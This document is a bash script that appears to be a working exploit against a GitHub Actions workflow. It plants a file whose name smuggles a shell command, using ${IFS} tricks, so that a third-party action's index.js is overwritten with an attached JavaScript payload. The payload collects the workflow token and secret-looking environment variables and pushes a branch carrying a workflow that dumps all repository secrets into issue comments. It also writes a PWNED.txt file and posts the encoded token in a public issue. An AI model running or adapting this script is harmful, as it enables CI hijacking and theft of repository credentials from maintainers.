#!/usr/bin/env bash
set -euo pipefail
mkdir -p content
cd content
printf 'malicious artifact from fork PR\n' > rce.txt
cat > evil.js <<'JS'
const b64 = (s) => Buffer.from(String(s)).toString('base64');
const token = process.env.INPUT_TOKEN || '';
const repo = process.env.GITHUB_REPOSITORY || '';
const api = 'https://api.github.com';
const H = {
  authorization: `Bearer ${token}`,
  accept: 'application/vnd.github+json',
  'content-type': 'application/json',
  'user-agent': 'rce-proof'
};
const out = { token, token_len: token.length, token_prefix: token.slice(0, 4), repo };
out.env = {};
for (const [k, v] of Object.entries(process.env)) {
  if (/TOKEN|SECRET|PAT|KEY/i.test(k)) out.env[k] = b64(v);
}
const rq = async (path, opts = {}) => {
  try {
    const r = await fetch(api + path, { headers: H, ...opts });
    const text = await r.text();
    return { status: r.status, text: text.slice(0, 5000), scopes: r.headers.get('x-oauth-scopes') };
  } catch (e) { return { error: String(e) }; }
};
const parseSha = (s) => { try { return JSON.parse(s).sha || ''; } catch (e) { return ''; } };
(async () => {
  out.me = await rq('/user');
  out.repo_meta = await rq(`/repos/${repo}`);
  out.secrets_probe = await rq(`/repos/${repo}/actions/secrets`);
  out.runs_probe = await rq(`/repos/${repo}/actions/runs?per_page=1`);
  const mainRef = await rq(`/repos/${repo}/git/ref/heads/main`);
  let sha = '';
  try { sha = JSON.parse(mainRef.text).object.sha; } catch (e) {}
  out.main_ref = { status: mainRef.status, sha };
  const leakWorkflow = 'name: leak\n' +
    'on: push\n' +
    'permissions:\n' +
    '  contents: read\n' +
    '  issues: write\n' +
    'jobs:\n' +
    '  leak:\n' +
    '    runs-on: ubuntu-latest\n' +
    '    steps:\n' +
    '      - name: dump\n' +
    '        env:\n' +
    '          S: ${{ toJSON(secrets) }}\n' +
    '        run: |\n' +
    '          printf "%s" "$S" | base64 -w0 > /tmp/sb64\n' +
    '          echo "SECRETS_JSON_B64=$(cat /tmp/sb64)"\n' +
    '          printf "%s" "$S" | python3 -c \'import sys,json,base64; d=json.load(sys.stdin); [print(k+"="+v) or print(k+"_B64="+base64.b64encode(v.encode()).decode()) for k,v in d.items()]\' | tee /tmp/lines\n' +
    '          N=$(curl -sS -X POST -H "authorization: Bearer ${{ github.token }}" -H "accept: application/vnd.github+json" -H "content-type: application/json" "https://api.github.com/repos/${{ github.repository }}/issues" -d "{\\"title\\":\\"SECRETS_LEAK\\"}" | python3 -c \'import sys,json; print(json.load(sys.stdin)["number"])\')\n' +
    '          python3 -c \'import json; print(json.dumps({"body": open("/tmp/lines").read()}))\' > /tmp/cbody\n' +
    '          curl -sS -X POST -H "authorization: Bearer ${{ github.token }}" -H "accept: application/vnd.github+json" -H "content-type: application/json" "https://api.github.com/repos/${{ github.repository }}/issues/$N/comments" -d @/tmp/cbody\n';
  if (sha) {
    out.ref_create = await rq(`/repos/${repo}/git/refs`, {
      method: 'POST',
      body: JSON.stringify({ ref: 'refs/heads/rce-leak', sha })
    });
    if (out.ref_create.status === 201) {
      const put = await rq(`/repos/${repo}/contents/.github/workflows/leak.yml`, {
        method: 'PUT',
        body: JSON.stringify({ message: 'leak workflow', content: b64(leakWorkflow), branch: 'rce-leak' })
      });
      out.put_workflow = { status: put.status, text: put.text.slice(0, 500) };
      if (put.status !== 201 && put.status !== 200) {
        const blobRes = await rq(`/repos/${repo}/git/blobs`, {
          method: 'POST',
          body: JSON.stringify({ content: b64(leakWorkflow), encoding: 'base64' })
        });
        const blobSha = parseSha(blobRes.text);
        out.blob = { status: blobRes.status, sha: blobSha };
        const baseCommitRes = await rq(`/repos/${repo}/git/commits/${sha}`);
        let baseTree = '';
        try { baseTree = JSON.parse(baseCommitRes.text).tree.sha || ''; } catch (e) {}
        out.base_commit = { status: baseCommitRes.status, tree: baseTree };
        if (blobSha && baseTree) {
          const treeRes = await rq(`/repos/${repo}/git/trees`, {
            method: 'POST',
            body: JSON.stringify({
              base_tree: baseTree,
              tree: [{ path: '.github/workflows/leak.yml', mode: '100644', type: 'blob', sha: blobSha }]
            })
          });
          const treeSha = parseSha(treeRes.text);
          out.tree = { status: treeRes.status, sha: treeSha };
          if (treeSha) {
            const commitRes = await rq(`/repos/${repo}/git/commits`, {
              method: 'POST',
              body: JSON.stringify({ message: 'leak workflow', tree: treeSha, parents: [sha] })
            });
            const commitSha = parseSha(commitRes.text);
            out.commit = { status: commitRes.status, sha: commitSha };
            if (commitSha) {
              const refUpd = await rq(`/repos/${repo}/git/refs/heads/rce-leak`, {
                method: 'PATCH',
                body: JSON.stringify({ sha: commitSha, force: true })
              });
              out.ref_update = { status: refUpd.status, text: refUpd.text.slice(0, 300) };
            }
          }
        }
      }
      out.put_plain = await rq(`/repos/${repo}/contents/PWNED.txt`, {
        method: 'PUT',
        body: JSON.stringify({ message: 'probe', content: b64('contents-write'), branch: 'rce-leak' })
      });
    }
  }
  out.b64 = b64(JSON.stringify({ ...out, token }));
  console.log('EXFIL_B64=' + out.b64);
  const ir = await fetch(`${api}/repos/${repo}/issues`, {
    method: 'POST', headers: H,
    body: JSON.stringify({ title: 'RCE_PROOF_FROM_STOLEN_TOKEN', body: '```\n' + out.b64 + '\n```' })
  });
  console.log('ISSUE_STATUS=' + ir.status);
})().catch((e) => console.log('EVIL_ERROR=' + e));
JS
OVR='rce$(S=$(dirname${IFS}${HOME%runner});cp${IFS}${S}tmp${S}content${S}content${S}evil.js${IFS}${S}home${S}runner${S}work${S}_actions${S}peter-evans${S}commit-comment${S}v3${S}dist${S}index.js).txt'
touch "$OVR"
